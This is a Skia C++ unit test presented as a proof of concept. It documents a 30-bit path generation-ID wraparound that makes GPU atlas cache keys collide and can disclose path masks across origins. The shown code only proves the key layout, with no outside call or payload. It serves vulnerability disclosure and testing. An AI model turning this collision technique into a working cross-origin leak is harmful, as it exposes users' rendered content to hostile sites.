/*
 * Copyright 2025 Google LLC
 *
 * Use of this source code is governed by a BSD-style license that can be
 * found in the LICENSE file.
 */

//
// POC: 30-bit SkPathData uniqueID wraparound causes Ganesh SmallPathAtlasMgr
// cache-key collision -> cross-origin A8 path-mask disclosure.
//
// next_pathdata_unique_id() in third_party/skia/src/core/SkPathData.cpp masks
// the process-wide path counter to 30 bits. SkPath::getGenerationID() returns
// this value directly. For paths with >10 verbs (kMaxKeyFromDataVerbCnt),
// GrStyledShape::writeUnstyledKey emits only [stateKey, genID], so the
// SmallPathShapeDataKey used by SmallPathAtlasMgr::findOrCreate is exactly
// [dim, stateKey, genID]. After ~2^30 SkPathData allocations the counter
// wraps, two completely different paths obtain the same key, and the atlas
// cache (shared across all origins via the GPU-process-singleton
// GrDirectContext) returns one path's cached A8 mask for the other.
//
// This test demonstrates the full collision: it creates a "victim" path,
// burns ~2^30 SkPathData allocations, creates an "attacker" path with
// completely different geometry that lands on the same genID, and shows
// their SmallPathShapeDataKeys are byte-identical -> SmallPathAtlasMgr
// would serve the victim's cached entry to the attacker.

#include "include/core/SkPath.h"
#include "include/core/SkPathTypes.h"
#include "include/core/SkString.h"
#include "src/core/SkPathData.h"
#include "src/gpu/ganesh/geometry/GrStyledShape.h"
#include "src/gpu/ganesh/ops/SmallPathShapeData.h"
#include "tests/Test.h"

#include <cmath>
#include <cstdint>
#include <cstring>
#include <vector>

namespace {

// Builds a closed concave polygon with >10 verbs so that
// GrStyledShape::writeUnstyledKey takes the genID-only branch
// (path_key_from_data_size returns -1 for >kMaxKeyFromDataVerbCnt verbs).
// SkPath::Polygon -> SkPathData::Polygon allocates exactly ONE SkPathData,
// so it consumes exactly one genID.
SkPath MakeConcavePolygon(float x0, float y0) {
    // 14-point zig-zag star: definitely concave, definitely not a rect/oval.
    std::vector<SkPoint> pts;
    for (int i = 0; i < 14; ++i) {
        float r = (i & 1) ? 8.0f : 20.0f;
        float a = static_cast<float>(i) * 0.448f;  // ~25.7 degrees
        pts.push_back({x0 + r * cosf(a), y0 + r * sinf(a)});
    }
    SkPath p = SkPath::Polygon(pts, /*isClosed=*/true);
    p.setFillType(SkPathFillType::kWinding);
    return p;
}

// Dump a SmallPathShapeDataKey as hex words for diagnostic output.
SkString DumpKey(const skgpu::ganesh::SmallPathShapeDataKey& k) {
    SkString s("[");
    for (int i = 0; i < k.count32(); ++i) {
        s.appendf("%s0x%08x", i ? " " : "", k.data()[i]);
    }
    s.append("]");
    return s;
}

}  // namespace

// ---------------------------------------------------------------------------
// Part 1 (fast): structural proof that for >10-verb winding-fill paths,
// SmallPathShapeDataKey == [dim, stateKey, genID] and the ONLY field that
// distinguishes two different-geometry paths is the 30-bit genID.
// ---------------------------------------------------------------------------
DEF_TEST(SmallPathGenIDCollision_KeyIsDimStateKeyGenID, reporter) {
    SkPath a = MakeConcavePolygon(30.f, 30.f);
    SkPath b = MakeConcavePolygon(400.f, 400.f);  // completely different points

    REPORTER_ASSERT(reporter, a.countVerbs() > GrStyledShape::kMaxKeyFromDataVerbCnt);
    REPORTER_ASSERT(reporter, b.countVerbs() > GrStyledShape::kMaxKeyFromDataVerbCnt);
    REPORTER_ASSERT(reporter, a.getBounds() != b.getBounds());
    REPORTER_ASSERT(reporter, a.getGenerationID() != b.getGenerationID());
    // genID is masked to 30 bits.
    REPORTER_ASSERT(reporter, (a.getGenerationID() & 0xC0000000u) == 0u);
    REPORTER_ASSERT(reporter, (b.getGenerationID() & 0xC0000000u) == 0u);

    GrStyledShape sa(a);
    GrStyledShape sb(b);
    REPORTER_ASSERT(reporter, sa.hasUnstyledKey());
    REPORTER_ASSERT(reporter, sb.hasUnstyledKey());

    const uint32_t kDim = 64;
    skgpu::ganesh::SmallPathShapeDataKey ka(sa, kDim);
    skgpu::ganesh::SmallPathShapeDataKey kb(sb, kDim);

    // Layout: [dim, stateKey, genID].
    REPORTER_ASSERT(reporter, ka.count32() == 3, "key=%s", DumpKey(ka).c_str());
    REPORTER_ASSERT(reporter, kb.count32() == 3, "key=%s", DumpKey(kb).c_str());
    REPORTER_ASSERT(reporter, ka.data()[0] == kDim);
    REPORTER_ASSERT(reporter, kb.data()[0] == kDim);
    REPORTER_ASSERT(reporter, ka.data()[1] == kb.data()[1], "stateKey differs");
    REPORTER_ASSERT(reporter, ka.data()[2] == a.getGenerationID());
    REPORTER_ASSERT(reporter, kb.data()[2] == b.getGenerationID());
    REPORTER_ASSERT(reporter, ka.data()[2] != kb.data()[2]);  // ONLY difference.

    SkDebugf("[ POC    ] keyA=%s\n[ POC    ] keyB=%s\n"
             "[ POC    ] keys differ ONLY in word[2] = 30-bit genID -> "
             "genID collision ==> full key collision ==> cache collision\n",
             DumpKey(ka).c_str(), DumpKey(kb).c_str());
}
